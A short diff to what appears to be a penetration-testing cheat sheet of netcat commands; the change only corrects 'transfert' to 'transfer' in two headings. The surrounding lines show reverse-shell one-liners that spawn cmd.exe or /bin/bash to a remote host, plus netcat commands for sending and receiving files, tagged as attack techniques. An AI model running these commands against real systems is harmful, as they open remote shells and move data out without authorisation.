@@ -32,13 +32,13 @@ nc -nv <ip> <port> -e cmd.exe
 nc -nv <ip> <port> -e /bin/bash
 ```
 
-## nc transfert file - receiver
+## nc transfer file - receiver
 #plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
 nc -nlvp <port> > <incomming_file>
 ```
 
-## nc transfert file - sender
+## nc transfer file - sender
 #plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
 nc -nv <ip> <port> < <file_to_send>
